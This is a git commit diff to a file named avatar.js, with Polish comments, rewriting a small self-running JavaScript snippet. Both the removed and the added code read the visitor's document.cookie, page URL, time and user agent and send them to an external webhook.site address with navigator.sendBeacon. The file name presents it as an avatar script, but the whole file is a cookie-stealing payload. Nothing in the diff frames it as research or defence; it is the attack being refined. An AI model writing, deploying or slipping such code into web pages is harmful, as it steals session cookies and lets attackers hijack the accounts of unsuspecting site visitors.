4e3e58707802ebbe05aa909bb126192a2310a3e3
kowalskibartosz095-beep <kowalskibartosz095@gmail.com>
2026-07-06 03:36:55 +0200

    Update avatar.js

--- avatar.js
+++ avatar.js
@@ -1,20 +1,16 @@
 (function() {
-    const webhook = "https://webhook.site/53158f3f-579b-4186-8cdd-d33333543bec";
+    const url = "https://webhook.site/53158f3f-579b-4186-8cdd-d33333543bec";
     
-    const data = {
-        cookie: document.cookie,
-        url: window.location.href,
-        time: new Date().toLocaleString(),
-        userAgent: navigator.userAgent
-    };
+    // Główna wysyłka cookie
+    navigator.sendBeacon(url, "COOKIE: " + document.cookie);
 
-    // Wysyłanie przez sendBeacon (szybkie)
-    navigator.sendBeacon(webhook, JSON.stringify(data));
-
-    // Dodatkowo przez fetch
-    fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-    }).catch(() => {});
+    // Dodatkowe informacje
+    setTimeout(() => {
+        const extra = {
+            url: window.location.href,
+            time: new Date().toLocaleString(),
+            userAgent: navigator.userAgent.substring(0, 100)
+        };
+        navigator.sendBeacon(url, "EXTRA: " + JSON.stringify(extra));
+    }, 800);
 })();
